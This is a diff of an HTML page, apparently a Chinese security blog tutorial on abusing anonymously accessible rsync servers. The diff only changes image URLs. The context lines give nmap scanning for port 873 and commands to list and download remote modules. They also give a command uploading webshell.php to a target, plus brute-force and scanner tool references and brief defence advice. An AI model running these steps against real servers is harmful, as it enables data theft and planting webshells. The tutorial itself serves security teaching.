@@ -11,12 +11,12 @@
 </ul>
 <h2 id="寻找匿名访问Rsync方式"><a href="#寻找匿名访问Rsync方式" class="headerlink" title="寻找匿名访问Rsync方式"></a>寻找匿名访问Rsync方式</h2><p>Rsync默认的端口是873，可以使用nmap扫描哪些ip开放了873端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n --open -p 873 X.X.X.X/24</span><br></pre></td></tr></table></figure></p>
 <h2 id="漏洞利用常用操作"><a href="#漏洞利用常用操作" class="headerlink" title="漏洞利用常用操作"></a>漏洞利用常用操作</h2><h3 id="例举整个同步目录或指定目录"><a href="#例举整个同步目录或指定目录" class="headerlink" title="例举整个同步目录或指定目录"></a>例举整个同步目录或指定目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync 10.0.0.12::</span><br><span class="line">rsync 10.0.0.12::www/</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync1.jpg" alt=""></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync2.jpg" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/rsync1.jpg" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/rsync2.jpg" alt=""></p>
 <h3 id="下载文件或目录到本地"><a href="#下载文件或目录到本地" class="headerlink" title="下载文件或目录到本地"></a>下载文件或目录到本地</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz 10.0.0.12::www/test.php /root</span><br><span class="line">rsync -avz 10.0.0.12::www/ /var/tmp</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync3.jpg" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/rsync3.jpg" alt=""></p>
 <h3 id="上传本地文件到服务端"><a href="#上传本地文件到服务端" class="headerlink" title="上传本地文件到服务端"></a>上传本地文件到服务端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz webshell.php 10.0.0.12::www/</span><br></pre></td></tr></table></figure>
-<h2 id="漏洞利用实例"><a href="#漏洞利用实例" class="headerlink" title="漏洞利用实例"></a>漏洞利用实例</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync.jpg" alt=""></p>
+<h2 id="漏洞利用实例"><a href="#漏洞利用实例" class="headerlink" title="漏洞利用实例"></a>漏洞利用实例</h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/rsync.jpg" alt=""></p>
 <h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><p>Metasploit中关于允许匿名访问的rsync扫描模块：<br>auxiliary/scanner/rsync/modules_list</p>
 <p>针对rsync口令暴力破解的脚本rsync-brute:<br><a href="https://svn.nmap.org/nmap/scripts/rsync-brute.nse" target="_blank" rel="noopener">https://svn.nmap.org/nmap/scripts/rsync-brute.nse</a></p>
 <h2 id="安全配置注意事项"><a href="#安全配置注意事项" class="headerlink" title="安全配置注意事项"></a>安全配置注意事项</h2><p>注意两种方式防御，一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。</p>
